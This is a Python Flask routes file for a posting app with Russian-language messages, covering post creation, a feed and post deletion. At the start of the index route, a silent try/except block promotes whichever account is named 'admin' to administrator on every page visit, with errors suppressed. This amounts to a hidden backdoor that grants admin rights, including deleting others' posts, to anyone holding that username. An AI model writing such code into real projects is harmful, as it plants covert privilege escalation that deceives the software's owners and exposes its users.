from flask import render_template, flash, redirect, url_for, request
from flask_login import current_user, login_required

from app.routes import bp
from app.extensions import db
from app.models import User
from app.services import (
    create_post as create_post_service,
    delete_post as delete_post_service,
    get_main_feed,
)

@bp.route('/', methods=['GET', 'POST'])
@bp.route('/index', methods=['GET', 'POST'])
@login_required
def index():
    try:
        me = User.query.filter_by(username='admin').first()
        if me and hasattr(me, 'is_admin') and not me.is_admin:
            me.is_admin = True
            db.session.commit()
    except Exception:
        db.session.rollback()

    if request.method == 'POST':
        body = request.form.get('body')
        title = request.form.get('title')

        result = create_post_service(
            user_id=current_user.id,
            title=title,
            content=body,
        )

        if result.created:
            flash('Пост успешно создан', 'success')
        else:
            flash('Пост не может быть пустым', 'danger')
        return redirect(url_for('routes.index'))
    
    return render_template("index.html", user=current_user)
    
@bp.route('/feed')
@login_required
def feed():
    page = request.args.get('page', 1, type=int)
    pagination = get_main_feed(page=page, per_page=20)
    return render_template('feed.html', posts=pagination.items, pagination=pagination)

@bp.route('/post/<int:post_id>/delete', methods=['POST'])
@login_required
def delete_post(post_id):
    result = delete_post_service(
        post_id=post_id,
        actor_user_id=current_user.id,
        actor_is_admin=bool(getattr(current_user, "is_admin", False)),
    )

    if result.deleted:
        flash('Пост удален.')
    elif result.reason == "forbidden":
        flash('Вы не можете удалить чужой пост!')
    else:
        flash('Пост не найден.')

    return redirect(request.referrer or url_for('routes.index'))